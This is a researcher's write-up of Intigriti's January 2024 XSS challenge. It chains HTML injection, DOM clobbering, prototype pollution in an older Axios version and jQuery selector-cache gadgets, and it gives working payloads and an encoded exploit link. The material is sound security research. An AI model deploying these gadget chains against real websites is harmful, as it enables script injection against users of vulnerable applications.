---
source: kevin-mizu
source_url: https://mizu.re/post/intigriti-january-2024-xss-challenge
title: "Intigriti January 2024 - XSS Challenge | mizu.re"
description: "Intigriti January 2024 - XSS Challenge"
---

_keyboard\_arrow\_up_

title: Intigriti January 2024 - XSS Challenge

date: Jan 25, 2024

tags: [Writeup](https://mizu.re/tag/Writeup) [CSPP](https://mizu.re/tag/CSPP) [XSS](https://mizu.re/tag/XSS)

# Intigriti January 2024 - XSS Challenge

![](https://mizu.re/articles/writeups/Intrigriti_XSS/january2024/images/intigriti.png)

* * *

## Table of content

- [📜 Introduction](https://mizu.re/post/intigriti-january-2024-xss-challenge#introduction)
- [🕵️ Recon](https://mizu.re/post/intigriti-january-2024-xss-challenge#recon)
- [🏭 Axios Prototype Pollution](https://mizu.re/post/intigriti-january-2024-xss-challenge#cspp)
- [🎮 Taking control over the response data](https://mizu.re/post/intigriti-january-2024-xss-challenge#response)
- [🤔 Exploitation idea](https://mizu.re/post/intigriti-january-2024-xss-challenge#exploitation)
- [🌊 jQuery $(selector) execution flow](https://mizu.re/post/intigriti-january-2024-xss-challenge#jquery)
- [🔍 Finding DOM Clobbering + CSPP gadget](https://mizu.re/post/intigriti-january-2024-xss-challenge#gadgets)

  - [Reaching jQuery.select()](https://mizu.re/post/intigriti-january-2024-xss-challenge#select)
  - [Polluting the jQuery.select cache](https://mizu.re/post/intigriti-january-2024-xss-challenge#cache)
  - [Abuse a previously cached selector](https://mizu.re/post/intigriti-january-2024-xss-challenge#everything)

- [💥 TL/DR: Chain everything together](https://mizu.re/post/intigriti-january-2024-xss-challenge#chain)

## 📜 Introduction

This writeup aims to provide my solution to the [@intigriti](https://x.com/intigriti)'s January XSS challenge, which wasn't found during the challenge period. However, if you want to read about the unintended solutions, many great writeups have been written!

Here are some of them:

- [@joaxcar](https://x.com/joaxcar): [link](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/) (different one)
- [@\_CryptoCat](https://x.com/_CryptoCat): [link](https://bugology.intigriti.io/intigriti-monthly-challenges/0124).
- [@sudhanshur705](https://twitter.com/sudhanshur705): [link](https://github.com/Sudistark/CTF-Writeups/blob/main/Intigriti-XSS-Challenges/2024/Jan.md).
- [@ro61499133](https://twitter.com/ro61499133): [link](https://medium.com/@rodriguezjorgex/how-i-passed-the-intigriti-0124-challenge-b6c2d1cd1b7b).
- [@J0R1AN](https://twitter.com/J0R1AN): [link](https://jorianwoltjer.com/blog/p/hacking/intigriti-xss-challenge/intigriti-january-xss-challenge-0124).
- [@realansgar](https://x.com/realansgar): [link](https://realansgar.dev/writeups/intigriti-xss-0124).
- [@smickovskid](https://twitter.com/smickovskid): [link](https://damjan-smickovski.dev/blog/intigriti_challenge_0124_writeup).
- [@artuurssmirnovs](https://twitter.com/artuurssmirnovs): [link](https://github.com/arturssmirnovs/challenge-0124.intigriti.io-january-xss-challenge).
- [@sebsrxss](https://twitter.com/sebsrxss): [link](https://gist.github.com/sebastianosrt/804b9145bf491ba76107d26d9869bdd9).

## 🕵️ Recon

This challenge involves a small GitHub repository searching application. Here's what the website looks like:

![preview.gif](https://mizu.re/articles/writeups/Intrigriti_XSS/january2024/images/preview.gif)

Thanks to the application's source code, it is possible to gather some interesting information:

- The list of GitHub repositories is static, eliminating the possibility of exploiting any rogue GitHub repositories.

```js
app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item
            break;
        }
    }
    res.json(repo);
});
```

- The frontend uses [jQuery](https://github.com/jquery/jquery) and [Axios](https://github.com/axios/axios) to handle the website actions.

```js
function search(name) {
    $("img.loading").attr("hidden", false);

    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    }).then((d) => {
        $("img.loading").attr("hidden", true);
        const repo = d.data;
        if (!repo.owner) {
            alert("Not found!");
            return;
        }

        $("img.avatar").attr("src", repo.owner.avatar_url);
        $("#description").text(repo.description);
    });
}

window.onload = () => {
    const params = new URLSearchParams(location.search);
    if (params.get("search")) search();

    $("#search").submit((e) => {
        e.preventDefault();
        search();
    });
};
```

- There is an HTML injection sanitized by DOMPurify, in the ?name= parameter.

```js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
        return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search
    });
});
```

Keep in mind that the SANITIZE\_DOM DOMPurify option doesn't allow or disallow DOM Clobbering. DOM Clobbering is allowed by default by DOMPurify, turning it to false (not default config), will allows document and HTMLFormElement objects clobbering ( [ref](https://github.com/cure53/DOMPurify/blob/main/src%2Fpurify.js#L1103)). This will be useful in the second part of this writeup 👀

## 🏭 Axios Prototype Pollution

The first thing that might catch your attention in the search.ejs file is the following Axios query notation:

- ./src/view/search.ejs:

```html
<form id="search">
    <input name="q" value="<%= search %>">
</form>
<script>
    axios.post("/search", $("#search").get(0), {
        "headers": { "Content-Type": "application/json" }
    })
</script>
```

This notation / feature was added in the PR [#4735](https://github.com/axios/axios/pull/4735) two years ago to allow direct HTMLFormElement usage in the case of JSON request. For example:

- This HTML form:

```html
<form>
<input name="a.b.c" value="random">
<input name="ping" value="pong">
</form>
```

- Will be converted to:

```json
{ "a": { "b": { "c": "random" }}, "ping": "pong" }
```

> Why is this interesting in the challenge context?

In the latest version, the [formDataToJSON](https://github.com/axios/axios/blob/v1.x/lib%2Fhelpers%2FformDataToJSON.js) (which is used for the conversion) has a key check on **proto**. However, as the challenge doesn't uses the last one, this check isn't implemented yet! (This has been updated early 2024 by the PR [#6167](https://github.com/axios/axios/pull/6167))

This means that, in case we can control the submitted form's value, it should be possible to achieve a prototype pollution 💥

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.3/axios.js"></script>

<form id="f">
<input name="__proto__[polluted]" value="1">
</form>

<script>
axios.post("/", document.getElementById("f"), {
    "headers": { "Content-Type": "application/json" }
});
// axios.formToJSON(document.getElementById("f"));
alert(({}).polluted); // 1
</script>
```

_This is the PoC I've provided to the Axios project managers. Unfortunately they made a silent fix and didn't tagged me anywhere 😢_

In the challenge context, this is possible due to the HTML injection at the beginning of the document. Thanks to the use of $("#search").get(0), only the first matched element will be selected. Thus, using the following HTML will trigger the prototype pollution!

```html
<form id="search">
<input name="polluted" value="true">
</form>
```

## 🎮 Taking control over the response data

Now that we have a prototype pollution, since we want to leverage this to XSS, we need to find interesting gadgets. Finding a way to control the Axios response data seems to be to most logical first thing to do.

- ./src/views/search.ejs:

```js
axios.post("/search", $("#search").get(0), {
    "headers": { "Content-Type": "application/json" }
}).then((d) => {
    // ...
    const repo = d.data; // Try to control this
    // ...
});
```

The best way to achieve this is by polluting the baseURL value which is prepended to the provided fetched URL ( [ref](https://github.com/axios/axios/blob/v1.x/lib%2Fadapters%2Fxhr.js)). If you want to fully control the output without even setting up a web server, you could pollute it with data:,response data# :p

```html
<form id="search">
<input name="__proto__.baseURL" value="data:,{}#">
</form>
```

Fun fact, even if an Axios config has been declared to specify the options, the prototype pollution can be used to overwrite the value ( [ref](https://github.com/axios/axios/blob/v1.x/lib%2Fcore%2FAxios.js#L69)) :p

```js
<form id="search">
<input name="__proto__.baseURL" value="data:,{}#">
</form>

<script>
    const api  = axios.create({ baseURL: "https://mizu.re" });
    api.post("/", document.getElementById("search"), {
        "headers": { "Content-Type": "application/json" }
    }); // baseURL won't be overwrited
    api.get("/random"); // baseURL will be overwrited
</script>
```

_For more Axios prototype pollution gadgets, check out [@Bitk\_](https://twitter.com/bitk_) [researches](https://www.yeswehack.com/learn-bug-bounty/server-side-prototype-pollution-how-to-detect-and-exploit)._

## 🤔 Exploitation idea

Now that we control the response, if we take back the search.ejs page, here's what is executed using the response data:

- ./src/views/search.ejs:

```js
$("img.loading").attr("hidden", true);
const repo = d.data;
if (!repo.owner) {
    alert("Not found!");
    return;
}

$("img.avatar").attr("src", repo.owner.avatar_url);
$("#description").text(repo.description);
```

As we can see, there isn't much. However, one thing is important to note:

- A src attribute is set to an image with a value we control.
- There is an iframe tag within the DOM.

Since the jQuery .attr function sets the attribute to every match, we might ask ourselves:

> What if, using DOM Clobbering and the Prototype Pollution, we could make $("img.avatar") match the iframe, for example?

This way, we could be able to set javascript:alert() as the iframe's src and trigger an XSS 🤯

## 🌊 jQuery $(selector) execution flow

Before going further, to gain a better understanding of jQuery internals, here is a simplified sequential diagram illustrating the execution flow of $(selector):

![jquery.png](https://mizu.re/articles/writeups/Intrigriti_XSS/january2024/images/jquery.png)

1\. [$(selector)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/core.js#L21)

2\. [jQuery.init(selector)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/core/init.js#L18)

3\. [if starts by #](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/core/init.js#L61)

4\. [document.getElementById(selector)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/core/init.js#L94)

5\. [jQuery.find(selector)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L82)

6\. [documentIsHTML -> False](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L103)

7\. [jQuery.select(selector)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1288)

8\. [document.getElement...(value)](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L110-L138)

9\. [parse / cache the selector](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector/tokenize.js#L24-L67)

10\. [load the cached value](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector/tokenize.js#L17)

11\. [find each selector group in the document](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1297-L1350)

12\. [contains relative selector](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1326)

13\. [return results](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1343)

14\. [generate a group matcher](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1271)

15\. [apply the group matcher to each HTML node](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L865)

16\. [return results](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1361)

## 🔍 Finding DOM Clobbering + CSPP gadgets

### Reaching jQuery.select()

In the diagram above, there is one function (⑦) that contains an interesting block of code:

- jQuery \> /src/selector.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1288))

```js
function select(selector, context, results, seed) {
    var i, tokens, token, type, find,
        compiled = typeof selector === "function" && selector,
        match = !seed && tokenize((selector = compiled.selector || selector));
```

As we can see, if the selector argument is not a function, compiled will be set to false. Furthermore, even if compiled is false, it will try to access compiled.selector before the selector argument! Meaning that if we pollute \_\_proto\_\_.selector, we should be able to change the selector value 😎

Looking back to the diagram, we still have a problem, to reach the jQuery.select function, the documentIsHTML variable must be false, which is not the case here.

> But how is documentIsHTML set? On what criteria is it based?

To answer this question, we need to take a look to the isXMLDoc function: ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L336))

- jQuery \> /src/core.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/core.js#L313))

```js
rhtmlSuffix = /HTML$/i

isXMLDoc: function(elem) {
    var namespace = elem && elem.namespaceURI,
        docElem = elem && (elem.ownerDocument || elem).documentElement;

    return !rhtmlSuffix.test(namespace || docElem && docElem.nodeName || "HTML");
},
```

As we can see, if document.namespaceURI property doesn't contain HTML, it will treat the document is an XML one, which is exactly what we are looking for.

> How to do that?

Remember what I mentioned at the beginning, if the SANITIZE\_DOM DOMPurify option is set to false, it allows to clobber the document! This can be accomplished as follows:

```html
<img name="namespaceURI">
```

_This only works because DOM Clobbering occurs before jQuery is loaded. Otherwise, it won't work_

Thanks to this, it is possible to come up with the following jQuery gadget:

```html
<img name="namespaceURI">
<script>
    (false).__proto__.selector = "#mizu";
    $("random"); // Will match for "#mizu"
</script>
```

Unfortunately for us, this won't works as it needs to pollute the Boolean prototype which is not possible from the Axios CSPP. If you try to pollute the Object prototype, you will encounter an error due to the following part of jQuery:

- jQuery \> /src/selector/tokenize.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector/tokenize.js#L51))

```js
for ( type in filterMatchExpr ) {
    if ( ( match = jQuery.expr.match[ type ].exec( soFar ) ) && ( !preFilters[ type ] ||
        ( match = preFilters[ type ]( match ) ) ) ) {
```

The use of for ... in ... will traverse the prototype up to the Object one, and attempt to call each property, as we can't set a function to .selector, we need to find another way to get our XSS!

### Polluting the jQuery.select cache

Even if the for ... in ... loop prevents us from polluting the selector property, it is important to notice that this crash occurs in the parse / cache the selector phase (⑨). If we revisit our diagram, we can see that in case the tokenized selector has been cache earlier, the value will be loaded from the cache (⑩), bypassing the part of the code (⑨) that blocks us!

- jQuery \> /src/selector/tokenize.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector/tokenize.js#L16))

```js
function tokenize( selector, parseOnly ) {
    var matched, match, tokens, type,
        soFar, groups, preFilters,
        cached = tokenCache[ selector + " " ];

    if ( cached ) {
        return parseOnly ? 0 : cached.slice( 0 );
    }
    // Code that makes the crash
```

As we can see, if we pollute .selector to mizu and pollute **proto**.mizu<space>, the parsed value will be loaded from the cache without crashing!

This is what the tokenizedimg selector would look like (which is what we need to set into the cache)

```json
[[{\
    "value": "img",\
    "type": "TAG",\
    "matches":["img"]\
}]]
```

This way, we can change the selector to whatever we want without the need to pollute the Boolean prototype 🔥

```html
<img name="namespaceURI">
<script>
    (false).__proto__.selector = "mizu";
    ({}).__proto__["mizu "] = [[{\
        "value": "img",\
        "type": "TAG",\
        "matches":["img"]\
    }]]
    $("random"); // Will match for "img"
</script>
```

Unfortunately, once again, the Axios CSPP is too restrictive and disallows the creation of a xx<space> key... 😢

### Abuse a previously cached selector

Even though we can't pollute the jQuery.select cache with our own selector, we can still use any selector that has been previously used and cached (don't forget that it can't starts by # (③))

> Why is this significant?

Indeed, even if we don't have control over the cached value, it enables us to advance further in the jQuery execution process and possibly uncover another interesting gadget. Revisiting the diagram, what remains are:

11\. Find each selector group in the document.

14\. Generate a group matcher.

15\. Apply the group matcher to each HTML node.

Step ⑪ isn't particulary interesting because it uses a special set of find function over which we have no control ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L380)).

Steps ⑭ and ⑮ involve applying a custom matcher to each HTML node to check if they match the selector value. Therefore, being able to set custom rules might enable us to make the selector match everything 👀

To activate this part of the code, the selector needs to contain relative expressions, such as:

- >: child operator.
- <: closest operator.
- \|: rescoping operator.
- ...

In jQuery, they are listed this way:

- jQuery \> /src/selector.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L405))

```js
relative: {
    ">": { dir: "parentNode", first: true },
    " ": { dir: "parentNode" },
    "+": { dir: "previousSibling", first: true },
    "~": { dir: "previousSibling" }
}
```

As we can see, they are stored within an object! This means that we could pollute TAG, ATTR... to make them relative expression too. By doing so, every selector group would become relative, forcing the use of group matcher (⑭)🔥

- jQuery \> /src/selector.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1326))

```js
if ( jQuery.expr.relative[ ( type = token.type ) ] ) {
    break;
}
```

As this object is later used as a matching reference, the final step is to configure the relative expression properly to enforce them matching everything. This is how they are used later on (⑮):

- jQuery \> /src/selector.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L852)):

```js
function addCombinator( matcher, combinator, base ) {
    var dir = combinator.dir, // HERE
        skip = combinator.next,
        key = skip || dir,
        checkNonElements = base && key === "parentNode",
        doneName = done++

    return combinator.first ?
        function( elem, context, xml ) {
            while ( ( elem = elem[ dir ] ) ) { // HERE
                if ( elem.nodeType === 1 || checkNonElements ) {
                    return matcher( elem, context, xml ); // HERE
                }
            }
         return false;
    }
```

As we can see, the dir attribute of the relative selector object is used as an attribute iterator value. Subsequently, each Element\[dir\] is used in the matcher along with the context and the isXMLDoc() (true) value.

Therefore, we can control on each selector group which property is going to be used by the matcher function. Here is what the matcher looks like:

- jQuery \> /src/selector.js ( [ref](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1065))

```js
matchContext = addCombinator( function( elem ) {
    return elem === checkContext;
}, implicitRelative, true ),
```

At this point, I won't detail each variable state at each iteration of the match-checking loop. Therefore, with a bit of debugging, in order to ensure it matches everything (for a tag.class selector in the cache), we could end with this gadget (there is a lot of working payload) 🤯

```
<img name="namespaceURI">
<script>
    $("img.mizu"); // needs a tag + class selector before the pollution
    ({}).__proto__["selector"] = "img.mizu";
    ({}).__proto__["CLASS"] = {
        dir: "nextSibling",
        first: "true"
    };
    ({}).__proto__["TAG"] = {
        dir: "ownerDocument",
        next: "parentNode"
    }

    $("djdjdj"); // will match everything
</script>
```

Finally, this time, the pollution is compatible with the Axios CSPP 😭

## 💥 TL/DR: Chain everything together

- HTML Injection via ?name=.
- DOM Clobbering on #search.
- Prototype Pollution in Axios formDataToJSON function.
- Overwrite the baseURL to data:,# to control the response data.
- Clobber document.namespaceURI thanks to SANITIZE\_DOM: false to force [jQuery.select](https://github.com/jquery/jquery/blob/805cdb43fd02c3a5783c06b5ec2c9519be0682ab/src/selector.js#L1288) usage.
- Pollute selector to a previously cached value to avoid crashes.
- Pollute relative selectors to make it match everything.
- Use the controlled response to set the src attribute to javascript: on each DOM Element included <iframe>.

```html
<img name="namespaceURI">
<form id="search">
<input name="__proto__[baseURL]" value='data:,{"owner":{"avatar_url":"javascript:alert(1)"}}#'>
<input name="__proto__[selector]" value="img.loading">
<input name="__proto__[TAG][dir]" value="ownerDocument">
<input name="__proto__[TAG][next]" value="parentNode">
<input name="__proto__[CLASS][dir]" value="nextSibling">
<input name="__proto__[CLASS][first]" value="true">
</form>
```

Challenge PoC: [link](https://challenge-0124.intigriti.io/challenge/?name=%3Cimg%20name=%22namespaceURI%22%3E%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22__proto__%5BbaseURL%5D%22%20value%3D%27data%3A%2C%7B%22owner%22%3A%7B%22avatar_url%22%3A%22javascript%3Aalert%281%29%22%7D%7D%23%27%3E%3Cinput%20name%3D%22__proto__%5Bselector%5D%22%20value%3D%22img.loading%22%3E%3Cinput%20name%3D%22__proto__%5BTAG%5D%5Bdir%5D%22%20value%3D%22ownerDocument%22%3E%3Cinput%20name%3D%22__proto__%5BTAG%5D%5Bnext%5D%22%20value%3D%22parentNode%22%3E%3Cinput%20name%3D%22__proto__%5BCLASS%5D%5Bdir%5D%22%20value%3D%22nextSibling%22%3E%3Cinput%20name%3D%22__proto__%5BCLASS%5D%5Bfirst%5D%22%20value%3D%22true%22%3E%3Cform%3E&search=mizu)

![alert.png](https://mizu.re/articles/writeups/Intrigriti_XSS/january2024/images/alert.png)

[_keyboard\_arrow\_left_ Playing with DOMPurify's custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling)

[Another HTML Renderer _keyboard\_arrow\_right_](https://mizu.re/post/another-html-renderer)